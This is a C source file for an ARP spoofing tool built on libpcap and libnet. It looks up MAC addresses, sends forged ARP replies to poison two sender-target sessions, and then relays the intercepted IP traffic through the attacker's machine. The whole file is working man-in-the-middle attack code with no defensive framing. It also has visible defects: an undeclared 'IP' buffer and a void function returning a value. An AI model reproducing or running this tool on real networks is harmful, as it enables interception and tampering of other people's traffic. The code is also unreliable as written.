#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <libnet.h> 
#include <pcap.h> 
#include <netinet/in.h> 
#include <netinet/ether.h> 
#include <unistd.h>      
#include <arpa/inet.h> 
#include <time.h>

struct in_addr my_IP;
struct ether_addr my_MAC = {0x0};

struct in_addr sender_IP1;
struct in_addr target_IP1;
struct ether_addr sender_MAC1 = {0x0};
struct ether_addr target_MAC1 = {0x0};

struct in_addr sender_IP2;
struct in_addr target_IP2;
struct ether_addr sender_MAC2 = {0x0};
struct ether_addr target_MAC2 = {0x0};

void get_mine(const char *dev) 
{ 
	FILE* ptr; 
	char cmd[300]={0x0}; 
	char MAC[20] = {0x0};  
	int num;

	printf("1. Ubuntu 2. Kali \n");
	scanf("%d",&num);
	printf("\n");

	if(num == 1)
	{
		sprintf(cmd,"ifconfig | grep HWaddr | grep %s | awk '{print $5}'", dev);  
		ptr = popen(cmd, "r"); 
		fgets(MAC, sizeof(MAC), ptr); 
		pclose(ptr); 

		ether_aton_r(MAC, &my_MAC);  

		sprintf(cmd,"ifconfig | grep -A 1 %s | tail -n 1 | awk '{print $2}' | awk -F':' '{print $2}'",dev);  
		ptr = popen(cmd, "r");  
		fgets(IP, sizeof(IP), ptr); 
		pclose(ptr); 

		inet_aton(IP, &my_IP); 
	}

	if(num == 2)
	{

		sprintf(cmd,"ifconfig | grep -A 3 %s | grep ether | awk '{print $2}'", dev);  
		ptr = popen(cmd, "r");  
		fgets(MAC, sizeof(MAC), ptr); 
		pclose(ptr); 

		ether_aton_r(MAC, &my_MAC);

		sprintf(cmd,"ifconfig | grep -A 1 %s | grep inet | awk '{print $2}'", dev);  
		ptr = popen(cmd, "r");  
		fgets(IP, sizeof(IP), ptr); 
		pclose(ptr); 

		inet_aton(IP, &my_IP); 
	}

	return 0;
} 


int sendarp(pcap_t *pcd, const struct in_addr *target_IP, struct ether_addr *target_MAC) 
{ 

	char errbuf[PCAP_ERRBUF_SIZE];     
	const u_char *packet; 
	struct pcap_pkthdr *header; 
	struct libnet_ethernet_hdr etherhdr; 
	struct ether_arp arphdr; 
	struct libnet_ethernet_hdr *ethhdr_reply; 
	struct ether_arp *arphdr_reply; 
     
	struct ether_addr ether_target_MAC; 
	struct ether_addr arp_target_MAC; 
	int i, res; 
	int check=0;    
	time_t begin,finish;


	const int etherhdr_size = sizeof(struct libnet_ethernet_hdr); 
	const int arphdr_size = sizeof(struct ether_arp); 
	u_char buffer[etherhdr_size + arphdr_size];  

	for(i=0; i<6; i++) 
	{ 
		ether_target_MAC.ether_addr_octet[i] = 0xff; 
		arp_target_MAC.ether_addr_octet[i] = 0x0; 
	} 

	memcpy(etherhdr.ether_shost, &my_MAC.ether_addr_octet, ETHER_ADDR_LEN); 
	memcpy(etherhdr.ether_dhost, &ether_target_MAC.ether_addr_octet, ETHER_ADDR_LEN); 
	etherhdr.ether_type = htons(ETHERTYPE_ARP); // reverse ntohs 

	arphdr.arp_hrd = htons(ARPHRD_ETHER);  
	arphdr.arp_pro = htons(ETHERTYPE_IP); // format of protocol address 
	arphdr.arp_hln = ETHER_ADDR_LEN; // length of hardware address 
	arphdr.arp_pln = sizeof(in_addr_t); // length of protocol addres 
	arphdr.arp_op  = htons(ARPOP_REQUEST); // operation type 
	memcpy(&arphdr.arp_sha, &my_MAC.ether_addr_octet, ETHER_ADDR_LEN); 
	memcpy(&arphdr.arp_spa, &my_IP.s_addr, sizeof(in_addr_t)); 
	memcpy(&arphdr.arp_tha, &arp_target_MAC.ether_addr_octet, ETHER_ADDR_LEN); 
	memcpy(&arphdr.arp_tpa, &target_IP->s_addr, sizeof(in_addr_t));  

	memcpy(buffer, &etherhdr, etherhdr_size ); 
	memcpy(buffer + etherhdr_size, &arphdr, arphdr_size); 

	while(check != 1) 
	{
		begin=time(NULL);
		pcap_sendpacket(pcd,buffer,sizeof(buffer));
		while(1)
		{
			res = pcap_next_ex(pcd, &header, &packet); 
			finish=time(NULL);

			if(difftime(finish,begin) > 1)
				break; 
			if((res==0) || (res==-1)) continue; 

			ethhdr_reply = (struct libnet_ethernet_hdr *) packet;

			packet += sizeof(struct libnet_ethernet_hdr);       

			if(ntohs(ethhdr_reply->ether_type) == ETHERTYPE_ARP) 
			{
				arphdr_reply = (struct ether_arp *)packet; 
				if(arphdr_reply->arp_op == htons(ARPOP_REPLY)) 
				{ 
					if(!memcmp(&arphdr_reply->arp_spa, target_IP, 4) && !memcmp(&arphdr_reply->arp_tpa, &my_IP ,4)) 
					{     
						memcpy(target_MAC,&arphdr_reply->arp_sha,6); 
						printf("%s\n\n",(char*)ether_ntoa(arphdr_reply->arp_sha)); 
						check=1;                
						break;     
					} 
				} 
			}
		} 
	}

	return 0; 
}


int Infection(pcap_t *pcd, const struct in_addr *sender_IP, const struct ether_addr *sender_MAC, const struct in_addr *target_IP, const struct ether_addr *target_MAC) 
{ 
	const int etherhdr_size = sizeof(struct libnet_ethernet_hdr); 
	const int arphdr_size = sizeof(struct ether_arp); 
	u_char buffer[etherhdr_size + arphdr_size];
	struct libnet_ethernet_hdr etherhdr; 
	struct ether_arp arphdr; 

	memcpy(etherhdr.ether_shost, &my_MAC.ether_addr_octet, ETHER_ADDR_LEN);  
	memcpy(etherhdr.ether_dhost, &sender_MAC->ether_addr_octet, ETHER_ADDR_LEN); 
	etherhdr.ether_type = htons(ETHERTYPE_ARP); 

	arphdr.arp_hrd = htons(ARPHRD_ETHER);  
	arphdr.arp_pro = htons(ETHERTYPE_IP);  
	arphdr.arp_hln = ETHER_ADDR_LEN; 
	arphdr.arp_pln = sizeof(in_addr_t);  
	arphdr.arp_op  = htons(ARPOP_REPLY);  
	memcpy(&arphdr.arp_sha, &my_MAC.ether_addr_octet, ETHER_ADDR_LEN); 
	memcpy(&arphdr.arp_spa, &target_IP->s_addr, sizeof(in_addr_t)); 
	memcpy(&arphdr.arp_tha, &sender_MAC->ether_addr_octet, ETHER_ADDR_LEN); 
	memcpy(&arphdr.arp_tpa, &sender_IP->s_addr, sizeof(in_addr_t)); 

	memcpy(buffer, &etherhdr, etherhdr_size ); 
	memcpy(buffer + etherhdr_size, &arphdr, arphdr_size);

	if(pcap_sendpacket(pcd,buffer,sizeof(buffer)) == -1) 
	{ 
		pcap_perror(pcd,0); 
		pcap_close(pcd); 
		exit(1); 
	} 

	printf("Infection complete! \n\n");
	
	return 0;
}


int Relay(pcap_t *pcd)
{
	const u_char *packet; 
	struct pcap_pkthdr *header; 
	struct libnet_ethernet_hdr *etherhdr; 
	struct libnet_ipv4_hdr *iphdr; 
	struct ether_arp *arphdr;    
	struct in_addr dst_IP;    

	int i, res, length;     

	const int etherhdr_size = sizeof(struct libnet_ethernet_hdr); 
	const int arphdr_size = sizeof(struct ether_arp); 
	const int iphdr_size = sizeof(struct libnet_ipv4_hdr);  

	while(1) // 1) check timeout,  2) relay ip packet from sender to receiver 
	{
		u_char buffer[1000]={0x0};
		res = pcap_next_ex(pcd, &header, &packet); 	
		length=header->len;    	

		if((res==0) || (res==-1)) continue; 

		etherhdr= (struct libnet_ethernet_hdr *)packet;
		packet += sizeof(struct libnet_ethernet_hdr);

		if(!memcmp(&etherhdr->ether_shost, &sender_MAC1, 6) && (ntohs(etherhdr->ether_type) == ETHERTYPE_ARP))    
		{
			arphdr = (struct ether_arp *)packet;
			if(arphdr->arp_op == htons(ARPOP_REQUEST)) 
				if(!memcmp(&arphdr->arp_spa, &sender_IP1, 4) && !memcmp(&arphdr->arp_tpa, &target_IP1 ,4)) 
				{
					printf("Sender1 send ARP to Target1 !! \n");
					sleep(1);				
					Infection(pcd, &sender_IP1, &sender_MAC1, &target_IP1, &target_MAC1);
					continue;
				}
		}

		if(!memcmp(&etherhdr->ether_shost, &sender_MAC2, 6) && (ntohs(etherhdr->ether_type) == ETHERTYPE_ARP)) 
		{
			arphdr = (struct ether_arp *)packet;
			if(arphdr->arp_op == htons(ARPOP_REQUEST)) 
				if(!memcmp(&arphdr->arp_spa, &sender_IP2, 4) && !memcmp(&arphdr->arp_tpa, &target_IP2 ,4)) 
				{	
					printf("Sender2 send ARP to Target2 !! \n"); 
					sleep(1);					
					Infection(pcd, &sender_IP2, &sender_MAC2, &target_IP2, &target_MAC2);
					continue;
				}
		}

		if(!memcmp(&etherhdr->ether_shost, &sender_MAC1, 6) && (ntohs(etherhdr->ether_type) == ETHERTYPE_IP)) // relay
		{
			iphdr = (struct libnet_ipv4_hdr *)packet;
			if(!memcmp(&iphdr->ip_src, &sender_IP1, 4) && (memcmp(&iphdr->ip_dst, &my_IP, 4) != 0))
			{
				printf("Catch Sender1's Packet to %s \n",inet_ntoa(iphdr->ip_dst)); 

				memcpy(buffer+etherhdr_size, packet, (length-etherhdr_size)); // first, copy (ip_hdr ~ Data section) from packet to buffer.
				memcpy(&etherhdr->ether_shost, &my_MAC, 6);
				memcpy(&etherhdr->ether_dhost, &target_MAC1, 6);
				memcpy(buffer, etherhdr, etherhdr_size);
				if(pcap_sendpacket(pcd,buffer,length) == -1)  
				{ 
					pcap_perror(pcd,0); 
					pcap_close(pcd); 
					exit(1); 
				}
				printf("Relay Sender1's Packet Complete! \n\n");
				continue;		
			}
		}

		if(!memcmp(&etherhdr->ether_shost, &sender_MAC2, 6) && (ntohs(etherhdr->ether_type) == ETHERTYPE_IP)) // relay
		{
			iphdr = (struct libnet_ipv4_hdr *)packet;
			if(!memcmp(&iphdr->ip_dst, &target_IP2, 4))
			{
				printf("Catch Sender2's Packet to %s \n",inet_ntoa(iphdr->ip_dst)); 

				memcpy(buffer+etherhdr_size, packet, (length-etherhdr_size)); // first, copy (ip_hdr ~ Data section) from packet to buffer.
				memcpy(&etherhdr->ether_shost, &my_MAC, 6);
				memcpy(&etherhdr->ether_dhost, &target_MAC2, 6);
				memcpy(buffer, etherhdr, etherhdr_size);
				if(pcap_sendpacket(pcd,buffer,length) == -1)  
				{ 
					pcap_perror(pcd,0); 
					pcap_close(pcd); 
					exit(1); 
				}
				printf("Relay Sender2's Packet Complete! \n\n");
				continue;
			}
		}
	}

	return 0;
}

int main(int argc, char **argv) 	
{ 
	char *dev; 
	char errbuf[PCAP_ERRBUF_SIZE]; 
	pcap_t *pcd; 

	if(argc != 6)
	{
		printf("./arp_spoof [interface] [sender_IP1] [target_IP1] [sender_IP2] [target_IP2]\n");
		return 0;
	}

	dev = argv[1];

	pcd = pcap_open_live(dev, BUFSIZ,  1/*PROMISCUOUS*/, -1, errbuf); // PROMISCUOUS means, pcd captures all packets of local network. 

	if (pcd == NULL)
	{
		printf("%s\n", errbuf);
		exit(1);
	}

	if(inet_aton(argv[2], &sender_IP1)==0)
	{
		printf("error : %s \n", argv[2]);	
	}

	if(inet_aton(argv[3], &target_IP1)==0)
	{
		printf("error : %s \n", argv[3]);
		exit(1);
	}
	if(inet_aton(argv[4], &sender_IP2)==0)
	{
		printf("error : %s \n", argv[4]);
		exit(1);
	}

	if(inet_aton(argv[5], &target_IP2)==0)
	{
		printf("error : %s \n", argv[5]);
		exit(1);
	}

	get_mine(dev);
	
	// get mac_address of all sessions
	
	printf("get sender1's MAC starts~ \n");
	sendarp(pcd, &sender_IP1, &sender_MAC1);

	printf("get target1's MAC starts~ \n");
	sendarp(pcd, &target_IP1, &target_MAC1);

	printf("get sender2's MAC starts~ \n");
	sendarp(pcd, &sender_IP2, &sender_MAC2);
	
	printf("get target2's MAC starts~ \n");
	sendarp(pcd, &target_IP2, &target_MAC2);
	
	
	// infect all sessions

	Infection(pcd, &sender_IP1, &sender_MAC1, &target_IP1, &target_MAC1);
	Infection(pcd, &sender_IP2, &sender_MAC2, &target_IP2, &target_MAC2);
	
	// relay the caught packets

	Relay(pcd);

	return 0;
}

